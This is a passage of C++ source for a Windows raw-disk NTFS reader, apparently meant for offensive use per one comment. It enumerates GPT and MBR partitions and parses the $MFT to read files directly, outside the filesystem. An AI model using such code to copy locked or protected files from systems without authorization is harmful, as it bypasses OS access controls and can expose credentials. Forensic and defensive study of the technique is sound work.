#define _CRT_SECURE_NO_WARNINGS
#define _SILENCE_CXX17_CODECVT_HEADER_DEPRECATION_WARNING

// This tool crated by Shkudw
// https://github.com/ShkudW/NoNeedNTFS

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <string>
#include <map>
#include <vector>
#include <locale>
#include <codecvt>
#include <stdint.h>
#include <algorithm>
#include <memory>
#include <filesystem>

using namespace std;
namespace fs = std::filesystem;

#pragma pack(push, 1)

const DWORD MFT_SIGNATURE = 0x454C4946;
const DWORD ATTR_TYPE_ATTRIBUTE_LIST = 0x20;
const DWORD ATTR_TYPE_FILENAME = 0x30;
const DWORD ATTR_TYPE_DATA = 0x80;
const DWORD ATTR_TYPE_END = 0xFFFFFFFF;
const ULONGLONG MAX_FILE_SIZE = 1ULL << 30;
const int MAX_CONSECUTIVE_INVALID = 1000;

struct NTFS_BOOT_SECTOR { //https://ntfs.com/ntfs-partition-boot-sector.htm
    BYTE JumpBoot[3];
    BYTE OemName[8];
    WORD BytesPerSector;
    BYTE SectorsPerCluster;
    BYTE Reserved1[7];
    BYTE MediaDescriptor;
    BYTE Reserved2[2];
    WORD SectorsPerTrack;
    WORD NumberOfHeads;
    DWORD HiddenSectors;
    DWORD Reserved3;
    DWORD Reserved4;
    ULONGLONG TotalSectors;
    ULONGLONG MFT_LCN;
    ULONGLONG MFTMirr_LCN;
    signed char ClustersPerMFTRecord;
    BYTE Reserved5[3];
    BYTE ClustersPerIndexBuffer;
    BYTE Reserved6[3];
    ULONGLONG VolumeSerialNumber;
    DWORD Checksum;
    BYTE BootCode[426];
    WORD EndMarker;
};

struct GPT_HEADER { //https://en.wikipedia.org/wiki/GUID_Partition_Table
    BYTE Signature[8];
    DWORD Revision;
    DWORD HeaderSize;
    DWORD HeaderCRC32;
    DWORD Reserved;
    ULONGLONG CurrentLBA;
    ULONGLONG BackupLBA;
    ULONGLONG FirstUsableLBA;
    ULONGLONG LastUsableLBA;
    BYTE DiskGUID[16];
    ULONGLONG PartitionEntryLBA;
    DWORD NumberOfPartitions;
    DWORD PartitionEntrySize;
    DWORD PartitionArrayCRC32;
};

// MBR partition entry - 16 bytes per entry, 4 entries in MBR @ offset 0x1BE
// https://en.wikipedia.org/wiki/Master_boot_record
struct MBR_PARTITION_ENTRY {
    BYTE  BootIndicator;      // 0x80 = bootable, 0x00 = inactive
    BYTE  StartingCHS[3];     // Legacy CHS - we ignore
    BYTE  PartitionType;      // 0x07 = NTFS/exFAT, 0x05/0x0F = Extended (CHS/LBA), 0xEE = GPT protective
    BYTE  EndingCHS[3];       // Legacy CHS - we ignore
    DWORD StartingLBA;        // LBA of first sector (relative to MBR for primary, relative to EBR for logical)
    DWORD SizeInSectors;      // Length in sectors
};

// Represents a discovered NTFS partition anywhere on the disk (MBR primary, MBR logical, or GPT)
struct NtfsPartition {
    ULONGLONG StartLBA;       // Absolute LBA from disk start
    ULONGLONG SizeSectors;
    string    Source;         // "MBR-Primary", "MBR-Logical", "GPT"
    int       Index;          // Partition index for display
};

struct GPT_PARTITION_ENTRY {
    BYTE PartitionTypeGUID[16];
    BYTE UniquePartitionGUID[16];
    ULONGLONG StartingLBA;
    ULONGLONG EndingLBA;
    ULONGLONG Attributes;
    WCHAR PartitionName[36];
};

const BYTE BASIC_DATA_GUID[16] = {
    0xA2, 0xA0, 0xD0, 0xEB, 0xE5, 0xB9, 0x33, 0x44,
    0x87, 0xC0, 0x68, 0xB6, 0xB7, 0x26, 0x99, 0xC7
};

struct MFT_ENTRY_HEADER {
    DWORD Signature;
    WORD UpdateSequenceOffset;
    WORD UpdateSequenceSize;
    ULONGLONG LSN;
    WORD SequenceNumber;
    WORD HardLinkCount;
    WORD FirstAttributeOffset;
    WORD Flags;
    DWORD RealSize;
    DWORD AllocatedSize;
    ULONGLONG BaseFileRecord;
    WORD NextAttributeID;
    WORD Unused;
    DWORD MFTRecordNumber;
};

struct ATTRIBUTE_HEADER {
    DWORD AttributeType;
    DWORD Length;
    BYTE NonResident;
    BYTE NameLength;
    WORD NameOffset;
    WORD Flags;
    WORD AttributeID;
};

struct RESIDENT_ATTRIBUTE {
    DWORD ValueLength;
    WORD ValueOffset;
    BYTE IndexedFlag;
    BYTE Padding;
};

struct NONRESIDENT_ATTRIBUTE {
    ULONGLONG LowestVCN;
    ULONGLONG HighestVCN;
    WORD RunListOffset;
    WORD CompressionUnit;
    DWORD Padding;
    ULONGLONG AllocatedSize;
    ULONGLONG RealSize;
    ULONGLONG InitializedSize;
};

struct FILE_NAME_ATTRIBUTE {
    ULONGLONG ParentDirectory;
    ULONGLONG CreationTime;
    ULONGLONG ModificationTime;
    ULONGLONG MFTChangeTime;
    ULONGLONG LastAccessTime;
    ULONGLONG AllocatedSize;
    ULONGLONG RealSize;
    DWORD Flags;
    DWORD ReparseValue;
    BYTE FileNameLength;
    BYTE NamespaceType;
};

struct NON_RESIDENT_ATTRIBUTE {
    ULONGLONG StartingVCN;
    ULONGLONG EndingVCN;
    WORD DataRunsOffset;
    WORD CompressionUnitSize;
    DWORD Padding;
    ULONGLONG AllocatedSize;
    ULONGLONG RealSize;
    ULONGLONG InitializedSize;
};


#pragma pack(pop)

// Globals
ULONGLONG g_BytesPerSector = 512;
ULONGLONG g_SectorsPerCluster = 8;
ULONGLONG g_CDriveStartLBA = 0;
ULONGLONG g_MFT_LCN = 0;
ULONGLONG g_ClusterSize = 4096;

struct MFTEntryInfo {
    string filename;
    ULONGLONG parent_entry;
    ULONGLONG file_size;
    bool is_directory;
    bool valid;
};
map<ULONGLONG, MFTEntryInfo> g_MFTCache;

struct DataRun {
    ULONGLONG vcn_start;
    ULONGLONG length_clusters;
    LONGLONG absolute_lcn;
};

struct TargetFile {
    string full_path;
    string drive_letter;
    string normalized_path;
    string filename;
    string output_filename;
    DWORD disk_number;
    bool found = false;
};


vector<DataRun> g_MFT_Runs;
ULONGLONG g_MFTEntrySize = 1024;

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

string WideToUtf8(const WCHAR* wstr, int len) {
    if (len <= 0 || wstr == nullptr) return string();

    // First, calculate the required buffer size for the UTF-8 string
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr, len, NULL, 0, NULL, NULL);
    if (size_needed == 0) {
        return string(); // Conversion failed
    }

    // Allocate the buffer and perform the conversion
    string utf8_str(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr, len, &utf8_str[0], size_needed, NULL, NULL);

    return utf8_str;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

ULONGLONG GetMFTRecordSizeFromClusters(signed char clustersPerRecord, ULONGLONG bytesPerSector, ULONGLONG sectorsPerCluster) {
    if (clustersPerRecord < 0) {
        int power = -clustersPerRecord;
        return 1ULL << power;
    }
    else {
        return (ULONGLONG)clustersPerRecord * sectorsPerCluster * bytesPerSector;
    }
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

bool ApplyFixupToMFTRecord(BYTE* rec, SIZE_T rec_size) {
    if (rec_size < sizeof(MFT_ENTRY_HEADER)) return false;
    MFT_ENTRY_HEADER* hdr = (MFT_ENTRY_HEADER*)rec;
    WORD usaOffset = hdr->UpdateSequenceOffset;
    WORD usaCount = hdr->UpdateSequenceSize;
    if (usaOffset == 0 || usaCount < 2) return false;

    SIZE_T usaByteOffset = (SIZE_T)usaOffset;
    SIZE_T usaTotalSize = (SIZE_T)usaCount * sizeof(WORD);
    if (usaByteOffset + usaTotalSize > rec_size) return false;

    WORD* usa = (WORD*)(rec + usaByteOffset);
    WORD usn = usa[0];
    int sectors = (int)(usaCount - 1);
    if (g_BytesPerSector == 0) return false;
    SIZE_T sectorSize = (SIZE_T)g_BytesPerSector;
    if (rec_size < (SIZE_T)sectors * sectorSize) return false;

    for (int i = 0; i < sectors; i++) {
        SIZE_T last_two_offset = ((SIZE_T)(i + 1) * sectorSize) - sizeof(WORD);
        if (last_two_offset + sizeof(WORD) > rec_size) return false;
        WORD* diskWord = (WORD*)(rec + last_two_offset);
        if (*diskWord != usn) return false;
        *diskWord = usa[1 + i];
    }
    return true;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

bool ReadFromDrive(HANDLE hDisk, ULONGLONG lba, BYTE* buffer, ULONGLONG byteCount) {
    LARGE_INTEGER offset;
    offset.QuadPart = (LONGLONG)(lba * g_BytesPerSector);
    if (!SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN)) return false;

    DWORD toRead = (DWORD)byteCount;
    DWORD bytesRead = 0;
    if (!ReadFile(hDisk, buffer, toRead, &bytesRead, NULL)) return false;
    return ((ULONGLONG)bytesRead == byteCount);
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

bool ReadBootSector(HANDLE hDisk, ULONGLONG startLBA, NTFS_BOOT_SECTOR& outBoot) {
    BYTE buf[512];
    if (!ReadFromDrive(hDisk, startLBA, buf, 512)) return false;
    memcpy(&outBoot, buf, sizeof(NTFS_BOOT_SECTOR));
    return true;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

bool IsGPTDisk(HANDLE hDisk) {
    BYTE mbr[512];
    LARGE_INTEGER offset;
    offset.QuadPart = 0;
    SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);

    DWORD bytesRead;
    if (!ReadFile(hDisk, mbr, 512, &bytesRead, NULL)) {
        return false;
    }

    if (bytesRead >= 512 && mbr[450] == 0xEE) {
        return true;
    }

    BYTE gpt_header[512];
    offset.QuadPart = 512;
    SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);
    if (!ReadFile(hDisk, gpt_header, 512, &bytesRead, NULL)) {
        return false;
    }

    return (memcmp(gpt_header, "EFI PART", 8) == 0);
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

ULONGLONG FindCDriveStartLBA(HANDLE hDisk) {
    BYTE gpt_header_buffer[512];
    LARGE_INTEGER offset;
    offset.QuadPart = 512;
    SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);

    DWORD bytesRead;
    if (!ReadFile(hDisk, gpt_header_buffer, 512, &bytesRead, NULL)) {
        printf("[-] Failed to read GPT header\n");
        return 0;
    }

    const GPT_HEADER* gpt = (const GPT_HEADER*)gpt_header_buffer;

    if (memcmp(gpt->Signature, "EFI PART", 8) != 0) {
        printf("[-] Invalid GPT signature\n");
        return 0;
    }

    printf("  [+] GPT Header, Partition Entry LBA Section: %llu\n", gpt->PartitionEntryLBA);

    const DWORD ENTRIES_PER_SECTOR = 512 / 128;
    DWORD sectorsToRead = (gpt->NumberOfPartitions + ENTRIES_PER_SECTOR - 1) / ENTRIES_PER_SECTOR;

    for (DWORD sector = 0; sector < sectorsToRead; sector++) {
        BYTE partition_buffer[512];
        offset.QuadPart = (gpt->PartitionEntryLBA + sector) * 512;
        SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);

        if (!ReadFile(hDisk, partition_buffer, 512, &bytesRead, NULL)) {
            continue;
        }

        for (DWORD i = 0; i < ENTRIES_PER_SECTOR; i++) {
            const GPT_PARTITION_ENTRY* entry = (const GPT_PARTITION_ENTRY*)(partition_buffer + i * 128);

            if (memcmp(entry->PartitionTypeGUID, BASIC_DATA_GUID, 16) == 0) {
                ULONGLONG size = entry->EndingLBA - entry->StartingLBA;

                if (size > 1000000) {
                    printf("  [+] Found C: Drive at LBA %llu\n", entry->StartingLBA);
                    printf("  [+] Drive size: %.2f GB\n\n", (size * 512) / (1024.0 * 1024.0 * 1024.0));
                    return entry->StartingLBA;
                }
            }
        }
    }

    printf("[-] C: Drive not found\n");
    return 0;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// MBR support - parse the partition table and walk EBR chain for extended partitions.
//
// Notes for the offensive use-case:
//  * MBR primary table holds 4 entries at offset 0x1BE.
//  * Type 0x07 = "IFS" (NTFS/exFAT). We treat it as candidate NTFS and verify by reading boot sector.
//  * Type 0x05 / 0x0F = Extended Partition (CHS / LBA). It points to an EBR chain.
//  * Each EBR has the same 64-byte table layout as MBR but only first 2 entries matter:
//      [0] = the actual logical partition (relative LBA to current EBR)
//      [1] = pointer to next EBR (relative LBA to FIRST extended partition, NOT current EBR)
//  * Verification step: read the first sector of the candidate partition and check OEM "NTFS    ".
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

static bool IsNtfsBootSector(HANDLE hDisk, ULONGLONG lba) {
    BYTE sec[512];
    if (!ReadFromDrive(hDisk, lba, sec, 512)) return false;
    // OEM ID at offset 3, 8 bytes "NTFS    "
    return memcmp(sec + 3, "NTFS    ", 8) == 0;
}

// Walk a single EBR chain starting at firstExtendedLBA, append discovered logical NTFS partitions.
static void EnumerateEBRChain(HANDLE hDisk, ULONGLONG firstExtendedLBA, vector<NtfsPartition>& out, int& runningIndex) {
    ULONGLONG currentEBR = firstExtendedLBA;
    int safety = 0; // protect against malformed/looping chains

    while (currentEBR != 0 && safety < 128) {
        BYTE sector[512];
        if (!ReadFromDrive(hDisk, currentEBR, sector, 512)) break;
        if (sector[510] != 0x55 || sector[511] != 0xAA) break;

        const MBR_PARTITION_ENTRY* table =
            (const MBR_PARTITION_ENTRY*)(sector + 0x1BE);

        // Entry [0] = the logical partition itself (relative to current EBR)
        const MBR_PARTITION_ENTRY& logical = table[0];
        if (logical.PartitionType != 0x00 && logical.SizeInSectors > 0) {
            ULONGLONG absLBA = currentEBR + logical.StartingLBA;
            if (logical.PartitionType == 0x07 && IsNtfsBootSector(hDisk, absLBA)) {
                NtfsPartition p;
                p.StartLBA = absLBA;
                p.SizeSectors = logical.SizeInSectors;
                p.Source = "MBR-Logical";
                p.Index = runningIndex++;
                out.push_back(p);
                printf("  [+] MBR Logical NTFS @ LBA %llu (%.2f GB)\n",
                    absLBA, (logical.SizeInSectors * 512.0) / (1024.0 * 1024.0 * 1024.0));
            }
        }

        // Entry [1] = pointer to next EBR. CRITICAL: it is relative to firstExtendedLBA, not currentEBR.
        const MBR_PARTITION_ENTRY& nextPtr = table[1];
        if (nextPtr.PartitionType == 0x05 || nextPtr.PartitionType == 0x0F) {
            ULONGLONG nextEBR = firstExtendedLBA + nextPtr.StartingLBA;
            if (nextEBR == currentEBR) break; // loop guard
            currentEBR = nextEBR;
        }
        else {
            currentEBR = 0; // end of chain
        }
        safety++;
    }
}

// Enumerate all NTFS partitions on the disk - works for MBR and GPT.
// Returns absolute LBA + size for each NTFS volume found.
vector<NtfsPartition> EnumerateNTFSPartitions(HANDLE hDisk) {
    vector<NtfsPartition> result;
    int runningIndex = 0;

    if (IsGPTDisk(hDisk)) {
        // ---- GPT path ----
        BYTE hdrBuf[512];
        if (!ReadFromDrive(hDisk, 1, hdrBuf, 512)) {
            printf("[-] Failed reading GPT header\n");
            return result;
        }
        const GPT_HEADER* gpt = (const GPT_HEADER*)hdrBuf;
        if (memcmp(gpt->Signature, "EFI PART", 8) != 0) {
            printf("[-] Bad GPT signature\n");
            return result;
        }

        const DWORD entriesPerSector = 512 / 128;
        DWORD sectorsToRead = (gpt->NumberOfPartitions + entriesPerSector - 1) / entriesPerSector;

        for (DWORD s = 0; s < sectorsToRead; s++) {
            BYTE buf[512];
            if (!ReadFromDrive(hDisk, gpt->PartitionEntryLBA + s, buf, 512)) continue;

            for (DWORD i = 0; i < entriesPerSector; i++) {
                const GPT_PARTITION_ENTRY* e = (const GPT_PARTITION_ENTRY*)(buf + i * 128);
                // Skip empty
                bool empty = true;
                for (int k = 0; k < 16; k++) if (e->PartitionTypeGUID[k]) { empty = false; break; }
                if (empty) continue;

                if (memcmp(e->PartitionTypeGUID, BASIC_DATA_GUID, 16) == 0) {
                    if (IsNtfsBootSector(hDisk, e->StartingLBA)) {
                        NtfsPartition p;
                        p.StartLBA = e->StartingLBA;
                        p.SizeSectors = e->EndingLBA - e->StartingLBA + 1;
                        p.Source = "GPT";
                        p.Index = runningIndex++;
                        result.push_back(p);
                        printf("  [+] GPT NTFS @ LBA %llu (%.2f GB)\n",
                            (ULONGLONG)e->StartingLBA,
                            (p.SizeSectors * 512.0) / (1024.0 * 1024.0 * 1024.0));
                    }
                }
            }
        }
        return result;
    }

    // ---- MBR path ----
    BYTE mbr[512];
    if (!ReadFromDrive(hDisk, 0, mbr, 512)) {
        printf("[-] Failed reading MBR sector\n");
        return result;
    }
    if (mbr[510] != 0x55 || mbr[511] != 0xAA) {
        printf("[-] No MBR signature (0x55AA)\n");
        return result;
    }

    const MBR_PARTITION_ENTRY* primaries = (const MBR_PARTITION_ENTRY*)(mbr + 0x1BE);

    for (int i = 0; i < 4; i++) {
        const MBR_PARTITION_ENTRY& e = primaries[i];
        if (e.PartitionType == 0x00 || e.SizeInSectors == 0) continue;

        if (e.PartitionType == 0x05 || e.PartitionType == 0x0F) {
            // Extended container - walk the EBR chain
            printf("  [*] Extended partition #%d @ LBA %lu - walking EBR chain...\n",
                i, e.StartingLBA);
            EnumerateEBRChain(hDisk, e.StartingLBA, result, runningIndex);
            continue;
        }

        if (e.PartitionType == 0x07) {
            // Likely NTFS/exFAT - verify
            if (IsNtfsBootSector(hDisk, e.StartingLBA)) {
                NtfsPartition p;
                p.StartLBA = e.StartingLBA;
                p.SizeSectors = e.SizeInSectors;
                p.Source = "MBR-Primary";
                p.Index = runningIndex++;
                result.push_back(p);
                printf("  [+] MBR Primary NTFS @ LBA %lu (%.2f GB) [boot=%s]\n",
                    e.StartingLBA,
                    (e.SizeInSectors * 512.0) / (1024.0 * 1024.0 * 1024.0),
                    (e.BootIndicator == 0x80 ? "yes" : "no"));
            }
        }
    }

    return result;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

vector<DataRun> ParseDataRuns(const BYTE* data_runs, SIZE_T max_len) {
    vector<DataRun> runs;
    SIZE_T idx = 0;
    ULONGLONG vcn_cursor = 0;
    LONGLONG prev_lcn = 0;

    while (idx < max_len) {
        BYTE header = data_runs[idx];
        idx++;
        if (header == 0x00) break;

        int lengthSize = header & 0x0F;
        int offsetSize = (header >> 4) & 0x0F;

        if (lengthSize == 0 || lengthSize > 8 || offsetSize > 8) {
            break;
        }

        if (idx + lengthSize + offsetSize > max_len) {
            break;
        }

        ULONGLONG length = 0;
        for (int i = 0; i < lengthSize; i++) {
            length |= ((ULONGLONG)data_runs[idx + i]) << (8 * i);
        }
        idx += lengthSize;

        LONGLONG offset = 0;
        if (offsetSize > 0) {
            for (int i = 0; i < offsetSize; i++) {
                offset |= ((LONGLONG)data_runs[idx + i]) << (8 * i);
            }
            LONGLONG sign_bit = 1LL << (offsetSize * 8 - 1);
            if (offset & sign_bit) {
                LONGLONG mask = ((1LL << (offsetSize * 8)) - 1);
                offset = offset | (~mask);
            }
        }
        idx += offsetSize;

        LONGLONG lcn_start = prev_lcn + offset;

        DataRun r;
        r.vcn_start = vcn_cursor;
        r.length_clusters = length;
        r.absolute_lcn = lcn_start;
        runs.push_back(r);

        vcn_cursor += length;
        prev_lcn = lcn_start;
    }

    return runs;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

MFTEntryInfo ParseMFTEntry(const BYTE* mft_entry, ULONGLONG record_size) {
    MFTEntryInfo info;
    info.valid = false;
    info.parent_entry = 0;
    info.file_size = 0;
    info.is_directory = false;

    if (record_size < sizeof(MFT_ENTRY_HEADER)) return info;
    const MFT_ENTRY_HEADER* hdr = (const MFT_ENTRY_HEADER*)mft_entry;
    if (hdr->Signature != MFT_SIGNATURE) return info;
    info.is_directory = (hdr->Flags & 0x02) != 0;

    WORD attrOffset = hdr->FirstAttributeOffset;
    if (attrOffset == 0 || attrOffset >= record_size) return info;

    while (attrOffset + sizeof(ATTRIBUTE_HEADER) < record_size) {
        const ATTRIBUTE_HEADER* attr = (const ATTRIBUTE_HEADER*)(mft_entry + attrOffset);
        if (attr->Length == 0) break;
        if (attr->AttributeType == ATTR_TYPE_END) break;

        if (attr->AttributeType == ATTR_TYPE_FILENAME && attr->NonResident == 0) {
            const RESIDENT_ATTRIBUTE* r = (const RESIDENT_ATTRIBUTE*)(mft_entry + attrOffset + sizeof(ATTRIBUTE_HEADER));
            DWORD valOff = r->ValueOffset;
            if (valOff == 0) { attrOffset += attr->Length; continue; }
            const BYTE* valPtr = mft_entry + attrOffset + valOff;
            if (valPtr + sizeof(FILE_NAME_ATTRIBUTE) > mft_entry + record_size) { attrOffset += attr->Length; continue; }
            const FILE_NAME_ATTRIBUTE* fna = (const FILE_NAME_ATTRIBUTE*)valPtr;
            int name_len = fna->FileNameLength;
            if (name_len > 0 && name_len < 1024) {
                const WCHAR* wname = (const WCHAR*)(valPtr + sizeof(FILE_NAME_ATTRIBUTE));
                string utf8 = WideToUtf8(wname, name_len);
                info.filename = utf8;
                info.parent_entry = fna->ParentDirectory & 0x0000FFFFFFFFFFFFULL;
                info.file_size = fna->RealSize;
                info.valid = true;
            }
        }

        attrOffset += attr->Length;
    }

    return info;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

bool ReadMFTEntryUsingRunlist(HANDLE hDisk, ULONGLONG entry_number, BYTE* outBuf, ULONGLONG record_size) {
    ULONGLONG byteOffset = entry_number * record_size;
    ULONGLONG clusterIndex = byteOffset / g_ClusterSize;
    ULONGLONG offsetWithinCluster = byteOffset % g_ClusterSize;

    for (size_t i = 0; i < g_MFT_Runs.size(); i++) {
        DataRun& r = g_MFT_Runs[i];
        if (clusterIndex >= r.vcn_start && clusterIndex < r.vcn_start + r.length_clusters) {
            ULONGLONG insideRunIndex = clusterIndex - r.vcn_start;
            LONGLONG targetLCN = r.absolute_lcn + (LONGLONG)insideRunIndex;
            if (targetLCN < 0) return false;

            ULONGLONG bytesToCover = offsetWithinCluster + record_size;
            ULONGLONG clustersToRead = (bytesToCover + g_ClusterSize - 1) / g_ClusterSize;
            ULONGLONG bytesToRead = clustersToRead * g_ClusterSize;

            vector<BYTE> temp((size_t)bytesToRead);

            ULONGLONG readLBA = (ULONGLONG)targetLCN * g_SectorsPerCluster + g_CDriveStartLBA;
            if (!ReadFromDrive(hDisk, readLBA, temp.data(), bytesToRead)) {
                return false;
            }

            memcpy(outBuf, temp.data() + offsetWithinCluster, (size_t)record_size);

            if (!ApplyFixupToMFTRecord(outBuf, (SIZE_T)record_size)) {
                return false;
            }
            return true;
        }
    }

    return false;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

string ReconstructPath(HANDLE hDisk, ULONGLONG entry_number, ULONGLONG record_size, int max_depth = 256) {
    if (max_depth <= 0) return "???";
    if (entry_number == 5) return "C:\\";
    if (entry_number == 0 || entry_number > 0xFFFFFFFFFFFFULL) return "???";

    if (g_MFTCache.find(entry_number) == g_MFTCache.end()) {
        vector<BYTE> rec((size_t)record_size);
        if (!ReadMFTEntryUsingRunlist(hDisk, entry_number, rec.data(), record_size)) {
            MFTEntryInfo bad; bad.valid = false;
            g_MFTCache[entry_number] = bad;
            return "???";
        }
        MFTEntryInfo info = ParseMFTEntry(rec.data(), record_size);
        g_MFTCache[entry_number] = info;
        if (!info.valid) return "???";
    }

    MFTEntryInfo& info = g_MFTCache[entry_number];
    if (!info.valid) return "???";
    if (info.parent_entry == 5) return string("C:\\") + info.filename;
    if (info.parent_entry == 0) return string("C:\\") + info.filename;
    string parent = ReconstructPath(hDisk, info.parent_entry, record_size, max_depth - 1);
    if (parent == "???") return string("???\\") + info.filename;
    if (parent.back() == '\\') return parent + info.filename;
    return parent + "\\" + info.filename;
}

// Read a raw MFT record using an existing runlist. Used for ATTRIBUTE_LIST extension records.
// This is a pure-runlist reader that doesn't depend on g_MFT_Runs being complete yet.
static bool ReadMFTRecordViaRuns(HANDLE hDisk, const vector<DataRun>& runs,
    ULONGLONG entry_number, ULONGLONG record_size,
    BYTE* outBuf) {
    ULONGLONG byteOffset = entry_number * record_size;
    ULONGLONG clusterIndex = byteOffset / g_ClusterSize;
    ULONGLONG offsetWithinCluster = byteOffset % g_ClusterSize;

    for (size_t i = 0; i < runs.size(); i++) {
        const DataRun& r = runs[i];
        if (clusterIndex >= r.vcn_start && clusterIndex < r.vcn_start + r.length_clusters) {
            ULONGLONG insideRunIndex = clusterIndex - r.vcn_start;
            LONGLONG targetLCN = r.absolute_lcn + (LONGLONG)insideRunIndex;
            if (targetLCN < 0) return false;

            ULONGLONG bytesToCover = offsetWithinCluster + record_size;
            ULONGLONG clustersToRead = (bytesToCover + g_ClusterSize - 1) / g_ClusterSize;
            ULONGLONG bytesToRead = clustersToRead * g_ClusterSize;

            vector<BYTE> temp((size_t)bytesToRead);
            ULONGLONG readLBA = (ULONGLONG)targetLCN * g_SectorsPerCluster + g_CDriveStartLBA;
            if (!ReadFromDrive(hDisk, readLBA, temp.data(), bytesToRead)) return false;

            memcpy(outBuf, temp.data() + offsetWithinCluster, (size_t)record_size);
            if (!ApplyFixupToMFTRecord(outBuf, (SIZE_T)record_size)) return false;
            return true;
        }
    }
    return false;
}

// Extract data-runs from a $DATA attribute, appending to existing runs (for ATTRIBUTE_LIST case).
static void MergeDataRunsFromAttr(const BYTE* recRecord, WORD offset, ULONGLONG record_size,
    vector<DataRun>& accum) {
    const ATTRIBUTE_HEADER* attr = (const ATTRIBUTE_HEADER*)(recRecord + offset);
    if (attr->NonResident == 0) return;
    const NONRESIDENT_ATTRIBUTE* nonres =
        (const NONRESIDENT_ATTRIBUTE*)(recRecord + offset + sizeof(ATTRIBUTE_HEADER));
    WORD runlistOffset = nonres->RunListOffset;
    if (runlistOffset == 0) return;
    if ((ULONGLONG)offset + attr->Length > record_size) return;
    const BYTE* runlistPtr = recRecord + offset + runlistOffset;
    SIZE_T maxLen = attr->Length - runlistOffset;

    // ParseDataRuns returns runs starting at vcn 0. For extension records the runs cover
    // a VCN range [nonres->LowestVCN .. nonres->HighestVCN]. We need to shift.
    vector<DataRun> runs = ParseDataRuns(runlistPtr, maxLen);
    ULONGLONG vcnBase = nonres->LowestVCN;
    for (auto& r : runs) {
        r.vcn_start += vcnBase;
        accum.push_back(r);
    }
}

bool BuildMFTRunlistFromEntry0(HANDLE hDisk, ULONGLONG record_size) {
    ULONGLONG bytesToRead = max(record_size, g_ClusterSize);
    ULONGLONG clustersToRead = (bytesToRead + g_ClusterSize - 1) / g_ClusterSize;
    ULONGLONG readBytes = clustersToRead * g_ClusterSize;

    vector<BYTE> rec((size_t)readBytes);

    if (!ReadFromDrive(hDisk, (ULONGLONG)g_MFT_LCN * g_SectorsPerCluster + g_CDriveStartLBA, rec.data(), readBytes)) {
        if (!ReadFromDrive(hDisk, (ULONGLONG)g_MFT_LCN * g_SectorsPerCluster + g_CDriveStartLBA, rec.data(), g_ClusterSize)) {
            return false;
        }
    }

    vector<BYTE> recRecord((size_t)record_size);
    memset(recRecord.data(), 0, (size_t)record_size);
    memcpy(recRecord.data(), rec.data(), min((size_t)readBytes, (size_t)record_size));

    if (!ApplyFixupToMFTRecord(recRecord.data(), (SIZE_T)record_size)) {
        // Fixup failed, but continue
    }

    const MFT_ENTRY_HEADER* hdr = (const MFT_ENTRY_HEADER*)recRecord.data();
    if (hdr->Signature != MFT_SIGNATURE) return false;

    // ---- First pass on the base record: collect $DATA runs (if present) and detect ATTRIBUTE_LIST ----
    vector<DataRun> accumRuns;
    bool hasAttrList = false;
    WORD attrListOffset = 0;

    WORD offset = hdr->FirstAttributeOffset;
    SIZE_T rec_size_t = (SIZE_T)record_size;
    while (offset + sizeof(ATTRIBUTE_HEADER) < rec_size_t) {
        const ATTRIBUTE_HEADER* attr = (const ATTRIBUTE_HEADER*)(recRecord.data() + offset);
        if (attr->Length == 0) break;
        if (attr->AttributeType == ATTR_TYPE_END) break;

        if (attr->AttributeType == ATTR_TYPE_ATTRIBUTE_LIST) {
            hasAttrList = true;
            attrListOffset = offset;
        }
        else if (attr->AttributeType == ATTR_TYPE_DATA && attr->NonResident != 0) {
            MergeDataRunsFromAttr(recRecord.data(), offset, record_size, accumRuns);
        }

        offset += attr->Length;
    }

    if (!hasAttrList) {
        if (accumRuns.empty()) return false;
        g_MFT_Runs = accumRuns;
        printf("  [+] $MFT runlist: %zu run(s) [single base record]\n", g_MFT_Runs.size());
        return true;
    }

    // ---- ATTRIBUTE_LIST path: read the list, follow extension records, accumulate all $DATA runs ----
    printf("  [*] $MFT has ATTRIBUTE_LIST (0x20) - following extension records...\n");

    const ATTRIBUTE_HEADER* alAttr =
        (const ATTRIBUTE_HEADER*)(recRecord.data() + attrListOffset);

    // Read the attribute list contents (resident or non-resident)
    vector<BYTE> alData;
    if (alAttr->NonResident == 0) {
        const RESIDENT_ATTRIBUTE* res =
            (const RESIDENT_ATTRIBUTE*)(recRecord.data() + attrListOffset + sizeof(ATTRIBUTE_HEADER));
        const BYTE* p = recRecord.data() + attrListOffset + res->ValueOffset;
        alData.assign(p, p + res->ValueLength);
    }
    else {
        // Non-resident ATTRIBUTE_LIST - need to read via its own data runs.
        // The list runs live inside the base record itself.
        const NONRESIDENT_ATTRIBUTE* nonres =
            (const NONRESIDENT_ATTRIBUTE*)(recRecord.data() + attrListOffset + sizeof(ATTRIBUTE_HEADER));
        const BYTE* runlistPtr = recRecord.data() + attrListOffset + nonres->RunListOffset;
        SIZE_T maxLen = alAttr->Length - nonres->RunListOffset;
        vector<DataRun> listRuns = ParseDataRuns(runlistPtr, maxLen);
        ULONGLONG realSize = nonres->RealSize;
        alData.resize((size_t)realSize);

        ULONGLONG copied = 0;
        for (const auto& r : listRuns) {
            if (r.absolute_lcn <= 0) { copied += r.length_clusters * g_ClusterSize; continue; }
            ULONGLONG lba = (ULONGLONG)r.absolute_lcn * g_SectorsPerCluster + g_CDriveStartLBA;
            ULONGLONG bytes = r.length_clusters * g_ClusterSize;
            vector<BYTE> buf((size_t)bytes);
            if (!ReadFromDrive(hDisk, lba, buf.data(), bytes)) return false;
